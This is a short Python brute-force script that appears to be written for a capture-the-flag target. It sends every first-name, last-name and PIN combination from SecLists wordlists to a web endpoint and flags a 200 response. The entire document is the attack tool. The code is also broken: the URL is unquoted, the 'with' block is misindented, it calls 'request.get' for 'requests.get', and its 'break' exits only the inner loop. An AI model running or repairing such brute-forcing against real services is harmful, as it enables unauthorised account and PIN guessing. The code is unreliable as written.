import requests

# Update the url for your target
url = http://192.168.100.10:8000/flag?

# Update the files below for desired wordlists, etc.
first_name_file = '/usr/share/wordlists/seclists/Usernames/Names/firstname.txt'
last_name_file = '/usr/share/wordlists/seclists/Usernames/Names/lastname.txt'
pin_file = '/usr/share/wordlists/seclists/Fuzzing/pins.txt'

# Define the brute force function
def brute():
    with open(first_name_file) as first_names, open(last_name_file) as last_names, open(pin_file) as pins:
    first_name = [line.rstrip() for line in first_names]
    last_name = [line.rstrip() for line in last_names]
    pin = [line.rstrip() for line in pins]
    for n in first_name:
        for l in last_name:
            for p in pin:
                # Update the url_request to match the URL you're trying to hit
                url_request = url + 'fname=' + n + '&lname=' + l + '&pin=' + p
                response = request.get(url_request, allow_redirects=True)
                if response.status_code != 200:
                    print(str(response.status_code) + " Status Code :: " + url_request + " :: Nothing Found.")
                elif response.status_code == 200:
                    print(str(response.status_code) + " Status Code :: " + url_request + " :: Something Found.")
                    break
# Run the brute force function
brute()
